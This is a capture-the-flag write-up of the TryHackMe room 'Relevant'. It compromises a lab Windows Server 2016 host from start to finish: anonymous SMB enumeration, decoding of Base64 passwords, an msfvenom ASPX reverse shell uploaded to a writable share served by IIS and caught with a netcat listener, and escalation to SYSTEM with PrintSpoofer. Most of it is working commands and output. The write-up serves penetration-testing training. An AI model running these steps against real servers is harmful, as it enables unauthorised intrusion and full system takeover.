# Relevant - TryHackMe

> **Kill Chain Summary**:
> Network Reconnaissance (Ports 80, 135, 139, 445, 3389, 49663) -> Anonymous SMB Share Discovery (`nt4wrksv`) -> Identifying Writable SMB Share Mapped to IIS Web Server Root (Port 49663) -> Uploading Standalone ASPX Reverse Shell -> Triggering Shell Execution via HTTP -> Foothold as `iis apppool\defaultapppool` -> Privilege Audit (`whoami /priv` -> `SeImpersonatePrivilege Enabled`) -> Token Impersonation via PrintSpoofer -> Elevated Shell (`NT AUTHORITY\SYSTEM`).

| Property | Value |
| :--- | :--- |
| **Target Name** | Relevant |
| **Platform** | TryHackMe |
| **OS** | Windows Server 2016 Standard Evaluation |
| **Difficulty** | Medium |
| **Status** | Rooted |
| **Key Techniques** | SMB Share Enumeration, Writable SMB Mapped to IIS Web Root, ASPX Reverse Shell, Token Impersonation (PrintSpoofer) |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was performed using Nmap:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.10.120.65 10.10.120.65
```

**Open Ports:**

| Port | Service | Version | Description |
| :--- | :--- | :--- | :--- |
| 80/tcp | HTTP | Microsoft IIS httpd 10.0 | Default IIS landing page |
| 135/tcp | MSRPC | Microsoft Windows RPC | Standard Windows management |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn | NetBIOS session service |
| 445/tcp | microsoft-ds | Windows Server 2016 | Active SMB service |
| 3389/tcp | RDP | Microsoft Terminal Services | Remote Desktop protocol |
| 49663/tcp | HTTP | Microsoft IIS httpd 10.0 | Secondary high-port IIS web server |

### 1.2 SMB Enumeration

Listing available SMB shares with null credentials:

```bash
smbclient -L //10.10.120.65/ -N
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
```

The share `nt4wrksv` allows unauthenticated access. Connecting to the share:

```bash
smbclient //10.10.120.65/nt4wrksv -N
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
smb: \> get passwords.txt
```

Inspecting `passwords.txt` revealed Base64-encoded credentials:

```text
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Decoding the strings:

```bash
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
# Bob - !P@$$W0rD!123

echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
# Bill - Juw4nnaM4n420696969!$$$
```

Testing these credentials against SMB and RDP returned access denied. However, anonymous write access was confirmed on the `nt4wrksv` share.

---

## 2. Initial Access

### 2.1 Correlating SMB Share with IIS Web Root

High-port web servers often host secondary development directories or map network shares to web roots. Testing the share name `nt4wrksv` against both web ports:
- `http://10.10.120.65:80/nt4wrksv/passwords.txt` -> 404 Not Found
- `http://10.10.120.65:49663/nt4wrksv/passwords.txt` -> **200 OK (File Returned)**

> [!NOTE] Concept: Web Root Mapped to Writable SMB Share
> The IIS instance on port 49663 is configured with a virtual directory pointing directly to the filesystem path backing the `nt4wrksv` SMB share. Because the SMB share permits write access, uploading an executable ASPX payload allows remote code execution via HTTP.

### 2.2 Uploading and Executing ASPX Reverse Shell

Generate a standalone ASPX reverse shell payload using `msfvenom` or download a verified ASPX reverse shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o reverse.aspx
```

Upload the shell directly via SMB:

```bash
smbclient //10.10.120.65/nt4wrksv -N
smb: \> put reverse.aspx
smb: \> ls
  reverse.aspx                        A    27254
```

Start a Netcat listener:

```bash
nc -lvnp 4444
```

Trigger the reverse shell by sending a GET request to the uploaded file:

```bash
curl http://10.10.120.65:49663/nt4wrksv/reverse.aspx
```

The listener catches the reverse shell executing under the IIS application pool identity:

```text
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.120.65] 49832
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

Retrieve the user flag:

```cmd
type C:\Users\Bob\Desktop\user.txt
```

```text
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Local Enumeration: Account Privileges

Checking security tokens assigned to `iis apppool\defaultapppool`:

```cmd
whoami /priv
```

```text
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

The `SeImpersonatePrivilege` token privilege is **Enabled**.

### 3.2 Exploitation: Token Impersonation via PrintSpoofer

Because the target is running Windows Server 2016, **PrintSpoofer** provides a reliable, non-Metasploit privilege escalation vector exploiting named pipe impersonation via the Print Spooler service.

#### Step 1: Upload PrintSpoofer via SMB
Upload the `PrintSpoofer64.exe` binary directly into the writable SMB share:

```bash
smbclient //10.10.120.65/nt4wrksv -N
smb: \> put PrintSpoofer64.exe
```

#### Step 2: Locate Staged Binary on the Target
Locate the uploaded executable on the local filesystem:

```cmd
dir \PrintSpoofer64.exe /s
```

The binary is located at `c:\inetpub\wwwroot\nt4wrksv\PrintSpoofer64.exe`.

#### Step 3: Execute PrintSpoofer
Navigate to the directory and run PrintSpoofer with the interactive command flag:

```cmd
cd c:\inetpub\wwwroot\nt4wrksv
PrintSpoofer64.exe -i -c cmd
```

```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
C:\Windows\system32> whoami
nt authority\system
```

The shell is elevated to `NT AUTHORITY\SYSTEM`.

Retrieve the root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Decode Base64 Strings
echo "<BASE64_STRING>" | base64 -d

# Non-Interactive SMB File Upload
smbclient //<TARGET_IP>/<SHARE> -N -c "put <LOCAL_FILE>"

# Recursive File Search Across Windows Disks
dir \<FILENAME> /s

# Exploit SeImpersonatePrivilege on Windows Server 2016
PrintSpoofer64.exe -i -c cmd
```

---

## 5. Key Takeaways and Lessons Learned

1. **SMB and Web Server Correlation:** A writable SMB share paired with an open IIS web server strongly implies that the share directory is exposed through a web virtual path. Always test accessing uploaded files across all open web ports.
2. **IIS File Format Requirements:** Standard PHP payloads will not execute on default IIS configurations. Always use `.aspx` payloads when targeting Microsoft Internet Information Services.
3. **PrintSpoofer for Windows Server 2016:** On modern Windows versions (Server 2016, 2019, Windows 10), PrintSpoofer is the preferred exploit for `SeImpersonatePrivilege` as it does not rely on BITS CLSID configurations.

---

#tryhackme #windows #medium #smb #base64 #iis #aspx #webshell #seimpersonate #printspoofer #privesc